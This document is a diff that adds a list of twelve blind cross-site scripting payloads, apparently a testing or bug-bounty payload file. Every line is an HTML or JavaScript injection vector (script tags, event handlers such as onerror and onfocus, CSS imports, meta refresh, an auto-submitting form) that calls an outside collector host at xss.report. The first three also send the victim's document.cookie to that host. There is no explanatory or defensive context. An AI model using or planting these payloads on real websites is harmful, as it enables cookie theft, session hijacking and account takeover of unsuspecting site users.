@@ -1,0 +1,12 @@
+<script>fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)</script>
+<img src=x onerror=fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)>
+<svg onload=fetch('https://COLLECTOR.xss.report/c/yukthi93?c='+document.cookie)>
+<link rel=stylesheet href=https://COLLECTOR.xss.report/c/yukthi93>
+<object data=https://COLLECTOR.xss.report/c/yukthi93>
+<iframe src=https://COLLECTOR.xss.report/c/yukthi93>
+<input autofocus onfocus=fetch('https://COLLECTOR.xss.report/c/yukthi93')>
+<body onload=fetch('https://COLLECTOR.xss.report/c/yukthi93')>
+<details open ontoggle=fetch('https://COLLECTOR.xss.report/c/yukthi93')>
+<style>@import url(https://COLLECTOR.xss.report/c/yukthi93)</style>
+<meta http-equiv=refresh content=0;url=https://COLLECTOR.xss.report/c/yukthi93>
+<form action=https://COLLECTOR.xss.report/c/yukthi93 method=POST><button autofocus onfocus=document.forms[0].submit()>click</button></form>
